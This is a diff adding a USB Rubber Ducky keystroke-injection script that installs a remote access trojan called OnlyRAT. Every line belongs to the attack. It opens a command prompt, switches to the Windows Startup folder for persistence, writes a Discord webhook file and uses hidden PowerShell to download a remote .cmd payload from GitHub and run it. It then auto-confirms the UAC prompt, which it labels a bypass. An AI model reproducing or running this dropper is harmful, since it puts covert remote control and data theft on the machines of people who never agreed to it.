@@ -1,0 +1,28 @@
+REM OnlyRAT installer via the USB Rubber Ducky
+REM Created by : C0SM0
+
+REM open the command linve via the runbox
+DELAY 1000
+GUI r
+DELAY 400
+STRING cmd 
+ENTER
+
+REM execute discord webhook installer
+DELAY 800
+STRING set "YKHfpmMRoQ=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+ENTER
+STRING cd %YKHfpmMRoQ%
+ENTER
+REM replace "DISCORDWEBHOOK" with your Discord Webhook
+STRING echo DISCORDWEBHOOK > lawFvVTikZ.txt
+ENTER
+STRING powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/dw1.cmd -OutFile wEaoFkNduy.cmd"
+ENTER
+DELAY 200
+STRING powershell ./wEaoFkNduy.cmd && exit
+ENTER
+
+REM UAC bypass
+DELAY 1800
+ALT y
